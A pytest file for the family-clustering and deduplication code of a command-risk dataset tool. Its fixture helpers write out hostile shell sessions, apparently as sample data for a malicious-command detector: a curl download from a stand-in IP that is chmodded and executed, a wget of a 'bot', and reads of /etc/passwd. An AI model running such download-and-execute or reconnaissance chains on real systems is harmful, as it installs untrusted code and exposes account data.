"""Regression tests for the v4 streaming family/cluster core.

The v4 corpus is two orders of magnitude larger than v3, so
:func:`cmdrisk.data.dedup.assign_family_ids` and its NumPy clustering backend
are the load-bearing path.  These tests lock in the provenance and
memory-boundary guarantees that the million-row build depends on.
"""

from __future__ import annotations

import numpy as np
import pytest

from cmdrisk.data.dedup import (
    assign_families,
    assign_family_ids,
    cap_families,
    select_capped_indices,
)
from cmdrisk.data.normalization import session_skeleton
from cmdrisk.data.streaming import (
    StreamingFormatError,
    candidate_pairs,
    cluster_records,
    shingle_hashes,
)
from cmdrisk.schema import CommandEvent, Label, SessionRecord, SourceInfo, SourceKind


def _session(
    session_id: str,
    commands: list[str],
    *,
    family_id: str = "pending",
    kind: SourceKind = SourceKind.SCRIPT_BENIGN,
    parent_session_id: str | None = None,
) -> SessionRecord:
    return SessionRecord(
        session_id=session_id,
        source=SourceInfo(
            kind=kind,
            name="test",
            parent_session_id=parent_session_id,
            license="CC0-1.0",
        ),
        family_id=family_id,
        commands=[CommandEvent(cmd=command) for command in commands],
        label=Label(malicious=0, quality="high"),
    )


def _attack(marker: str) -> list[str]:
    return [
        f"curl http://198.51.100.1/{marker} -o /tmp/{marker}",
        f"chmod +x /tmp/{marker}",
        f"/tmp/{marker}",
        "id",
        "uname -a",
    ]


def _long_attack(marker: str) -> list[str]:
    base = _attack(marker)
    return base + [
        "cat /etc/passwd",
        "ps aux",
        "netstat -antp",
        "crontab -l",
        "wget http://198.51.100.2/bot",
        "chmod 777 /tmp/bot",
        "systemctl status sshd",
        "kill -9 1234",
        "history",
    ]


def _columns(records: list[SessionRecord]):
    shingles = [
        shingle_hashes(session_skeleton(record), ngram=3, max_commands=160)
        for record in records
    ]
    return (
        [record.session_id for record in records],
        [record.family_id for record in records],
        [record.source.parent_session_id for record in records],
        shingles,
    )


def _assign(records: list[SessionRecord], **kwargs):
    session_ids, families, parents, shingles = _columns(records)
    return assign_family_ids(session_ids, families, parents, shingles, **kwargs)


def test_explicit_family_ids_are_unioned_before_similarity() -> None:
    records = [
        _session("a", _attack("a"), family_id="attack-family"),
        _session("b", _attack("b"), family_id="attack-family"),
        # Dissimilar session that still declares the same explicit family:
        # provenance must win over the similarity threshold.
        _session("c", ["pwd", "ls", "whoami"], family_id="attack-family"),
    ]

    family_ids, stats = _assign(records)

    assert len(set(family_ids)) == 1
    assert family_ids == ["attack-family"] * 3
    assert stats.forced_pairs >= 1


def test_parent_session_lineage_links_parent_and_child() -> None:
    records = [
        _session("parent", ["pwd", "ls", "whoami", "id", "uname -a"]),
        _session("child", _attack("x"), parent_session_id="parent"),
    ]

    family_ids, stats = _assign(records)

    assert family_ids[0] == family_ids[1]
    assert stats.lineage_links >= 1


def test_parent_session_chain_groups_all_children() -> None:
    records = [
        _session("parent", ["pwd", "ls", "whoami", "id", "uname -a"]),
        _session("c1", ["echo one", "echo two", "echo three", "echo four"], parent_session_id="parent"),
        _session("c2", ["id", "whoami", "hostname", "ls -la", "env"], parent_session_id="parent"),
    ]

    family_ids, stats = _assign(records)

    assert len(set(family_ids)) == 1
    assert stats.lineage_links >= 2


def test_conflicting_explicit_family_ids_in_one_cluster_raise() -> None:
    records = [
        _session("a", _attack("a"), family_id="family-a"),
        _session("b", _attack("b"), family_id="family-b"),
    ]

    with pytest.raises(ValueError, match="conflicting explicit"):
        _assign(records)


def test_short_sessions_with_identical_shingles_are_exact_grouped() -> None:
    records = [
        _session("s1", ["id"]),
        _session("s2", ["id"]),
        _session("s3", ["whoami"]),
    ]

    family_ids, stats = _assign(records)

    assert family_ids[0] == family_ids[1]
    assert family_ids[2] not in {family_ids[0]}
    assert stats.short_session_groups >= 1


def test_empty_columns_return_empty_result() -> None:
    family_ids, stats = assign_family_ids([], [], [], [])

    assert family_ids == []
    assert stats.sessions == 0
    assert stats.families == 0


def test_column_length_mismatch_raises() -> None:
    with pytest.raises(ValueError, match="same length"):
        assign_family_ids(["a"], [], [], [])


def test_oversized_lsh_bucket_is_skipped_and_counted() -> None:
    # 40 byte-identical long sessions collapse into a single LSH bucket that
    # exceeds max_bucket_size; the pass must not crash and must report it.
    records = [_session(f"dup-{index}", _long_attack("same")) for index in range(40)]

    family_ids, stats = _assign(
        records,
        max_bucket_size=4,
        max_pairs=10_000,
    )

    assert stats.skipped_buckets >= 1
    # Without verification the identical families are not merged by LSH...
    assert len(set(family_ids)) > 1
    # ...but provenance is not needed here, so the run simply reports the loss.


def test_candidate_pairs_skips_oversized_buckets() -> None:
    signature = np.zeros((6, 8), dtype=np.uint64)  # every band key identical
    shingles = [np.arange(32, dtype=np.uint64) for _ in range(6)]

    pairs, skipped = candidate_pairs(signature, bands=8, rows=1, max_bucket_size=3)

    assert pairs.shape == (0, 2)
    assert skipped >= 1


def test_candidate_pairs_respects_max_pairs() -> None:
    signature = np.vstack([np.zeros(8, dtype=np.uint64) for _ in range(8)])

    with pytest.raises(StreamingFormatError):
        candidate_pairs(signature, bands=8, rows=1, max_bucket_size=64, max_pairs=5)


def test_cluster_records_is_deterministic() -> None:
    records = [_session(f"s-{index}", _attack(str(index % 3))) for index in range(12)]
    _, _, _, shingles = _columns(records)

    first = cluster_records(shingles, threshold=0.9)
    second = cluster_records(shingles, threshold=0.9)

    assert first.labels.tolist() == second.labels.tolist()


def test_select_capped_indices_matches_cap_families() -> None:
    records = [
        _session(f"s-{index}", ["id"], family_id=f"family-{index % 3}")
        for index in range(60)
    ]

    keep = select_capped_indices(
        [record.family_id for record in records],
        [record.session_id for record in records],
        max_fraction=0.5,
        minimum=1,
        seed=7,
    )
    kept_records = cap_families(records, max_fraction=0.5, minimum=1, seed=7)

    # select_capped_indices returns indices sorted ascending; cap_families
    # additionally re-sorts the materialised records by session_id.
    assert sorted(records[index].session_id for index in keep) == sorted(
        record.session_id for record in kept_records
    )


def test_assign_family_ids_matches_assign_families() -> None:
    records = [
        _session("a", _attack("a")),
        _session("b", _attack("b")),
        _session("c", ["pwd", "ls", "id"]),
        _session("d", _attack("a"), family_id="explicit"),
    ]

    legacy = assign_families(records, threshold=0.9)
    streamed, _ = _assign(records, threshold=0.9)

    assert [record.family_id for record in legacy] == streamed


def test_forced_pairs_make_lineage_win_over_threshold() -> None:
    records = [
        _session("parent", ["pwd", "ls", "whoami", "id", "uname -a"]),
        _session("child", ["echo one", "echo two", "echo three", "echo four"], parent_session_id="parent"),
    ]
    _, _, _, shingles = _columns(records)

    without = cluster_records(shingles, threshold=0.9)
    with_lineage = cluster_records(shingles, threshold=0.9, extra_pairs=[(0, 1)])

    assert without.labels[0] != without.labels[1]
    assert with_lineage.labels[0] == with_lineage.labels[1]
    assert with_lineage.forced_pairs == 1
